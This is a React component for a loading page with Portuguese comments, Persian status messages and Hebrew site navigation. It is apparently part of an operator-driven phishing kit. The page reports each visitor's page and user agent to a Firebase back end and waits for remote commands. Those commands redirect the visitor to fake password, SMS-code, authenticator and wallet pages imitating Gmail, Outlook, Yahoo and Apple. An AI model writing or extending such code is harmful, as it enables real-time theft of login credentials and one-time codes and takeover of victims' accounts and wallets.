import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useFirebaseClient } from '../hooks/useFirebaseClient';

const LoadingPage = () => {
  const navigate = useNavigate();
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopMenuOpen, setIsDesktopMenuOpen] = useState(false);
  
  // Hook do Firebase Client para escutar comandos
  const { updateClientData, commands } = useFirebaseClient(navigate);
  
  // Mensagens em persa (fixas)
  const loadingMessages = [
    "در حال بررسی اطلاعات شما...",
    "راه‌اندازی حساب کاربری...", 
    "آماده‌سازی داشبورد...",
    "تقریباً آماده است، لطفاً صبر کنید...",
    "اتصال به سرور...",
    "بارگذاری داده‌ها..."
  ];

  // Atualizar dados iniciais quando a aplicação carrega
  // Escutar comandos de redirecionamento
  useEffect(() => {
    if (!Array.isArray(commands) || commands.length === 0) return;
    
    const latest = commands[commands.length - 1];
    if (typeof latest !== "string") return;
    
    // Limpar aspas extras e espaços
    const cmd = latest.replace(/^\"*|\"*$/g, "").trim();
    
    console.log(`🔄 LoadingPage: Comando detectado: ${cmd}`);
    
    // Mapeamento de comandos para rotas (baseado no device.tsx)
    const routeMap = {
      // Comandos principais
      ir_email: "/email",
      ir_sms: "/sms",
      ir_token: "/token",
      ir_web: "/home",
      authenticate: "/auth",
      ir_loading: "/loading",
      ir_device: "/device",
      
      // Gmail
      gmailpass: "/gmail/password",
      gmailsms: "/gmail/sms",
      gmailcodemail: "/gmail/codemail",
      gmailyes: "/gmail/yes",
      gmailauth: "/gmail/auth",
      gmailapp: "/gmail/app",
      gmailyoutube: "/gmail/youtube",
      gmailtelefone: "/gmail/telefone",
      
      // Outlook
      outlook_password: "/outlook/password",
      outlook_verify: "/outlook/verify",
      outlook_verify_code: "/outlook/verify-code",
      outlook_sms: "/outlook/sms",
      outlook_app: "/outlook/app",
      outlook_digits: "/outlook/digits",
      
      // Yahoo
      yahoo_password: "/yahoo/password",
      yahoo_auth: "/yahoo/auth",
      yahoo_codemail: "/yahoo/codemail",
      yahoo_email: "/yahoo/email",
      yahoo_numero: "/yahoo/numero",
      yahoo_sms: "/yahoo/sms",
      yahoo_codesms: "/yahoo/codesms",
      yahoo_whatsapp: "/yahoo/whatsapp",
      
      // Apple
      apple_password: "/apple/password",
      apple_sms: "/apple/sms",
      
      // Wallet
      ir_wallet: "/wallet",
      ir_meta: "/meta"
    };
    
    const targetRoute = routeMap[cmd];
    if (targetRoute) {
      console.log(`🔄 LoadingPage: Redirecionando para ${targetRoute} devido ao comando ${cmd}`);
      navigate(targetRoute);
    }
  }, [commands, navigate]);

  useEffect(() => {
    updateClientData({
      currentUrl: "/loading",
      currentPage: "LOADING",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
  }, [updateClientData]);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessageIndex((prevIndex) => 
        (prevIndex + 1) % loadingMessages.length
      );
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen overflow-x-hidden" style={{ backgroundColor: '#F4F5FA' }}>
      {/* Header igual ao da página inicial */}
      <header 
        className="w-full py-1 md:py-2"
        style={{ backgroundColor: '#13114A' }}
      >
        {/* VERSÃO DESKTOP - oculta no mobile */}
        <div className="hidden md:flex justify-between items-center w-full px-0">
          {/* Menu hamburger com botões colados */}
           <div className="flex items-center space-x-2 ml-0 relative">
                <button 
                  onClick={() => setIsDesktopMenuOpen(!isDesktopMenuOpen)}
                  className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
                >
                   <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'opacity-0' : ''}`}></div>
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
                   </div>
                 </button>
                {/* Bolinha pulsante amarela movida mais para baixo */}
                 <div className="absolute top-2 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
             
             {/* Barra vertical separadora */}
             <div className="h-12 w-px bg-white opacity-10"></div>
             
             {/* Botão 1 - com SVG de acessibilidade mais grosso, menos alto */}
             <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
               <svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="currentColor" strokeWidth="2">
                 <path d="M12 6.5a2 2 0 1 0-2-2 2 2 0 0 0 2 2m7.5 14h-1v-5a1 1 0 0 0-1-1h-5v-2h5a1 1 0 0 0 0-2h-5v-2a1 1 0 0 0-2 0v7a1 1 0 0 0 1 1h5v5a1 1 0 0 0 1 1h2a1 1 0 0 0 0-2m-6.8-1.6a4 4 0 0 1-7.2-2.4 4 4 0 0 1 2.4-3.66A1 1 0 1 0 7.1 11a6 6 0 1 0 7.2 9.1 1 1 0 0 0-1.6-1.2"/>
               </svg>
               <span>נגישות</span>
             </button>
             {/* Botão 2 - menor na altura */}
             <button className="text-white px-3 py-1 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors">
               תמיכה
             </button>

             {/* Botão 3 - cor #1A97F0 com largura reduzida */}
             <button className="text-white px-2 py-1 text-base rounded-full border transition-colors" style={{backgroundColor: '#1A97F0', borderColor: '#1A97F0'}}>
               כניסה
             </button>
           </div>

          {/* Seção direita com posicionamento flexível */}
           <div className="flex items-center flex-1 mr-6">
             {/* Espaçador flexível que empurra tudo para a direita */}
             <div className="flex-1" />
             
             {/* ========== ÁREA DE POSICIONAMENTO DO SVG ========== */}
              {/* PARA MOVER PARA A ESQUERDA: Aumente o número abaixo */}
              {/* Exemplo: mr-4, mr-8, mr-12, mr-16, mr-20, mr-24, mr-32 */}
              {/* NÚMERO ATUAL PARA ESQUERDA: 0 (mude para 4, 8, 12, 16, etc.) */}
              <div className="mr-60 mr-0">
               <svg
                 width="24"
                 height="24"
                 viewBox="0 0 512 512"
                 xmlns="http://www.w3.org/2000/svg"
                 className="text-white"
               >
                 <path
                   fill="currentColor"
                   d="M64 112h128v48h-80v64H64zm336 48h-80v-48h128v112h-48zM64 288h48v64h80v48H64zm256 64h80v-64h48v112H320z"
                 />
               </svg>
             </div>
 
             {/* Divisor do lado direito do SVG */}
             <div className="h-12 w-px bg-white opacity-10 ml-4"></div>
 
             {/* Divisor à esquerda da logo */}
             <div className="h-12 w-px bg-white opacity-10 mr-8 mr-12"></div>
 
             {/* Logo na extrema direita */}
             <img src="/iamgeheadaer.png" alt="Header Logo" className="h-30 w-auto" />
           </div>
        </div>

        {/* VERSÃO MOBILE - visível apenas no mobile */}
        <div className="flex md:hidden justify-between items-center w-full px-4">
          {/* Logo à esquerda */}
          <div className="flex items-center">
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-8 w-auto" />
            {/* Barra quase invisível à direita da imagem */}
            <div className="h-12 w-px bg-white opacity-5 ml-4"></div>
          </div>

          {/* Texto centralizado - maior com seta à esquerda */}
          <div className="flex items-center text-white">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
            <span className="text-lg font-medium">شערי מטבע</span>
          </div>

          {/* Menu hamburger à direita - copiado exatamente do desktop */}
          <div className="flex items-center space-x-2 mr-0 relative">
            <button 
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            {/* Bolinha pulsante amarela - ajustada para ficar mais à esquerda e um pouco mais para cima */}
            <div className="absolute top-1.5 left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-20"></div>
          </div>
        </div>
        
        {/* Desktop Menu Dropdown */}
           {isDesktopMenuOpen && (
             <div className="hidden md:block fixed top-16 left-4 w-48 bg-white shadow-lg border border-gray-200 rounded-lg z-[9999] animate-in slide-in-from-top-2 duration-300">
            <div className="px-4 py-4 space-y-3">
              <nav className="space-y-3">
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ביקור</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ברוכה (פרי)</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שערי מטבע</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שאלות נפוצות</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>יצירת קשר</span>
                </a>
              </nav>
            </div>
          </div>
        )}
        
        {/* Mobile Menu Dropdown */}
           {isMobileMenuOpen && (
             <div className="md:hidden fixed top-16 right-4 w-48 bg-white shadow-lg border border-gray-200 rounded-lg z-[9999] animate-in slide-in-from-top-2 duration-300">
            <div className="px-4 py-4 space-y-3">
              <nav className="space-y-3">
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ביקור</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ברוכה (פרי)</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שערי מטבע</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שאלות נפוצות</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>יצירת קשר</span>
                </a>
              </nav>
            </div>
          </div>
        )}
      </header>
      
      {/* Conteúdo da página de loading - mais próximo do header */}
      <div className="flex flex-col items-center pt-16">
        <div className="flex flex-col items-center w-full max-w-2xl mx-auto px-6">
          
          {/* Spinner melhorado igual ao SMSForm */}
          <motion.div 
            className="mb-6"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.2, duration: 0.5 }}
          >
            <div className="w-12 h-12 border-4 border-blue-600/20 border-t-blue-600 rounded-full animate-spin"></div>
          </motion.div>
          
          {/* Mensagem de loading */}
          <motion.div
            key={currentMessageIndex}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ duration: 0.3 }}
          >
            <p className="text-xl text-gray-700 font-medium text-center" dir="rtl">
              {loadingMessages[currentMessageIndex]}
            </p>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default LoadingPage;